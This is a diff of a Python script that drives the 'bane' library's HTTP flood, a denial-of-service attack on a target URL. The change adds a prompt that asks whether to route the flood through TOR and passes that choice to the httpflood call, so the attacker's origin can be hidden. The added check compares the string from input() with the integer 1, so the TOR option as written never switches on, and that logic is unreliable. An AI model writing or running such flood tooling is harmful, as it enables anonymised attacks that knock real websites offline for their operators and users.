@@ -40,8 +40,17 @@ while(n<5):
   n+=1
  except:
   pass
+while(n<6):
+ try:
+  tr=input('Use TOR?\n 1-Yes\n 2-No\n>')
+  n+=1
+ except:
+  pass
+to=False
+if tr==1:
+ to=True
 try:
- bane.httpflood(u,p=p,maxtime=ti,threads=th,interval=d,level=2)
+ bane.httpflood(u,p=p,maxtime=ti,threads=th,interval=d,level=2,settor=to)
 except KeyboardInterrupt:
  bane.ddos.stop=True
 
